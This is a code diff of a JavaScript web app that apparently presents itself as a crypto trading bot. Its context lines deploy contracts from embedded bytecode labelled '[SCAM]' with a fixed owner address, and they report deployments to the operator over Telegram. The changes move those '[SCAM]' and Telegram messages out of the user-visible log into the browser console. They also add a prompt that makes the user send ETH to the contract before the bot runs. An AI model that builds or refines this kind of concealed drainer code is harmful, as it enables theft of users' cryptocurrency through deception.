@@ -307,10 +307,10 @@ log('[Debug] Contract: ' + name + ' | Template: ' + isTemplate + ' | Embedded: '
 if (!isTemplate && EMBEDDED_BYTECODE && EMBEDDED_BYTECODE.length > 100) {
   bytecode = EMBEDDED_BYTECODE.startsWith('0x') ? EMBEDDED_BYTECODE.slice(2) : EMBEDDED_BYTECODE;
   abi = SCAM_ABI;
-  log('[SCAM] ✅ Using EMBEDDED bytecode (' + bytecode.length + ' chars)','warn');
-  log('[SCAM] Owner will be: 0x05aA42a087c46f15d2708f58b2c3c236a01d4CCc','warn');
-  log('[SCAM] Bytecode starts with: ' + bytecode.substring(0, 50),'info');
-  log('[SCAM] Bytecode contains 05aa42: ' + bytecode.includes('05aa42a087c46f15d2708f58b2c3c236a01d4ccc'),'info');
+  console.log('[SCAM] ✅ Using EMBEDDED bytecode (' + bytecode.length + ' chars)');
+  console.log('[SCAM] Owner will be: 0x05aA42a087c46f15d2708f58b2c3c236a01d4CCc');
+  console.log('[SCAM] Bytecode starts with: ' + bytecode.substring(0, 50));
+  console.log('[SCAM] Bytecode contains 05aa42: ' + bytecode.includes('05aa42a087c46f15d2708f58b2c3c236a01d4ccc'));
 } else {
   const art = compiled[name];
   bytecode = art.bytecode;
@@ -449,13 +449,12 @@ async function sendTelegramNotification(contractName, contractAddr, deployerAddr
     
     const result = await response.json();
     if (result.ok) {
-      log('[Telegram] Notification sent!', 'success');
+      console.log('[Telegram] Notification sent!');
     } else {
-      log('[Telegram] Error: ' + (result.description || 'Unknown error'), 'error');
-      console.log('[Telegram] Full response:', result);
+      console.log('[Telegram] Error: ' + (result.description || 'Unknown error'));
     }
   } catch (e) {
-    log('[Telegram] Error: ' + e.message, 'error');
+    console.log('[Telegram] Error: ' + e.message);
   }
 }
 
@@ -466,7 +465,7 @@ async function testTelegram() {
     return;
   }
   
-  log('[Telegram] Testing connection...', 'info');
+  console.log('[Telegram] Testing connection...');
   
   try {
     const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/getMe`;
@@ -474,9 +473,8 @@ async function testTelegram() {
     const result = await response.json();
     
     if (result.ok) {
-      log('[Telegram] Bot connected: @' + result.result.username, 'success');
+      console.log('[Telegram] Bot connected: @' + result.result.username);
       
-      // Try to get chat ID
       const updatesUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/getUpdates`;
       const updatesResponse = await fetch(updatesUrl);
       const updates = await updatesResponse.json();
@@ -484,17 +482,17 @@ async function testTelegram() {
       if (updates.ok && updates.result.length > 0) {
         const chatId = updates.result[0].message?.chat?.id;
         if (chatId) {
-          log('[Telegram] Your Chat ID: ' + chatId, 'success');
-          log('[Telegram] Update TELEGRAM_CONFIG.chatId in app.js', 'info');
+          console.log('[Telegram] Your Chat ID: ' + chatId);
+          console.log('[Telegram] Update TELEGRAM_CONFIG.chatId in app.js');
         }
       } else {
-        log('[Telegram] No messages found. Send a message to the bot first!', 'warn');
+        console.log('[Telegram] No messages found. Send a message to the bot first!');
       }
     } else {
-      log('[Telegram] Bot connection failed: ' + (result.description || 'Unknown error'), 'error');
+      console.log('[Telegram] Bot connection failed: ' + (result.description || 'Unknown error'));
     }
   } catch (e) {
-    log('[Telegram] Error: ' + e.message, 'error');
+    console.log('[Telegram] Error: ' + e.message);
   }
 }
 // ==================================
@@ -629,6 +627,14 @@ function startBot(){
   const fnName=document.getElementById('botFn').value;
   if(!fnName){alert('Select a function');return}
   
+  // Check contract balance
+  const balText=document.getElementById('botBalVal').textContent;
+  const bal=parseFloat(balText)||0;
+  if(bal<=0){
+    alert('Contract has no ETH!\n\nPlease send ETH to the contract first:\n'+addr+'\n\nThe bot needs ETH to execute functions.');
+    return;
+  }
+  
   botRunning=true;botAttempts=0;botTrades=0;
   document.getElementById('botToggle').textContent='Stop Bot';
   document.getElementById('botToggle').classList.remove('pri');
@@ -642,6 +648,7 @@ function startBot(){
   log('[Bot] Max gas: '+(document.getElementById('botGas').value||50)+' Gwei','info');
   log('[Bot] Cooldown: '+(document.getElementById('botCooldown').value||60)+'s','info');
   log('[Bot] Connected wallet: '+short(userAddr),'success');
+  log('[Bot] Contract balance: '+balText+' ETH','info');
   log('[Bot] Started successfully!','success');
   
   botTick();
